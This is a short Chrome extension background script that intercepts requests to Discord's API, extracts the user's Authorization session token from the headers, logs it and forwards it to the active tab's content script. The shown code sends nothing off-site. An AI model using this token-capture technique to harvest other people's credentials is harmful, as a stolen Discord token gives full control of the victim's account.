chrome.webRequest.onBeforeSendHeaders.addListener(
	function (details) {
		if (details.url.match(/discord.com\/api\//)) {
			const tokenTmp = details.requestHeaders.find(header => header.name.toLowerCase() == "authorization");
			if (tokenTmp) {
				console.log("トークン発見: " + tokenTmp.value);
				chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
					chrome.tabs.sendMessage(tabs[0].id, {
						doing: "token",
						token: tokenTmp.value,
						tab: tabs[0]
					});
				});
				return;
			}
		}
	},
	{urls: ['https://discord.com/*']},["requestHeaders"]
);